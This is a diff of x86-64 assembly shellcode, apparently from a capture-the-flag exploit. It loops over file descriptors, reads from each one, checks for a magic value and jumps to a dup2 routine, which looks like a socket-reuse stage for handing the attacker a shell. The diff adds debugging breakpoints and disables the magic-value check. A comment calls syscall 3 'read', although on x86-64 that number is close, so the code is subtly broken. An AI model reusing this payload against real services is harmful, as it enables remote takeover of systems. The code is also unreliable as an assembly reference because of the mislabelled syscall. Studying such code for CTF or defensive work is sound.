@@ -19,28 +19,30 @@ oursleep2:
 	inc eax 
 	jno oursleep2
 
-	;int 3			; debugging
-	
 	xor rdi,rdi
 	mov dil,20		;adjust for the popularity of the ctf
-	xor rcx,rcx
-	mov cl,4
+	xor rdx,rdx
+	mov dl,4
 		
 ourread:
 	dec rdi
+	cmp dil,3		
 	jnz next
+	int 3
 
 next:
 	xor rax,rax			
-	mov al,3		; rax needs system call number
+	mov al,3		; rax needs system call number read
 	lea rsi,[rel buffer] ; TODO get rid of \0
 	syscall
-	cmp al,4
-	jnz ourread
+	cmp al,-1
+	;cmp al,4
+	jle ourread
+	;int 3
 
 	mov rsi,[rel buffer] ; TODO get rid of \0
 	;mov rdx, [rsi]
-	cmp [rsi],dword 0xcafef00d
+	;cmp [rsi],dword 0xcafef00d
 	jnz ourread
 
 dup2: 	
